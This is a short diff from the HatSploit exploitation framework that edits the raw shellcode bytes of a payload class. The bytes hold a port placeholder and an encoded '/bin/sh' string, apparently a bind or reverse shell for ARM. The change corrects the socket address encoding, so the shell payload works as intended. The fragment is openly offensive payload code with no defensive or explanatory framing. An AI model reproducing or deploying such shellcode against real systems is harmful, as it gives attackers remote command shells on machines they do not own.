@@ -86,11 +86,10 @@ class HatSploitPayload(Payload, HatVenom):
             b"\x91\x42\xfa\xd1"
             b"\x03\xa0\xc1\x71"
             b"\x0b\x27\x01\xdf"
-            b":bport:port:"
-            b"\x11\x5c\x01\x01"
-            b"\x01\x01\x2f\x62"
-            b"\x69\x6e\x2f\x73"
-            b"\x68\x58"
+            b"\x02\xff:bport:port:"
+            b"\x01\x01\x01\x01"
+            b"\x2f\x62\x69\x6e"
+            b"\x2f\x73\x68\x58"
         )
 
         self.output_process("Generating payload...")
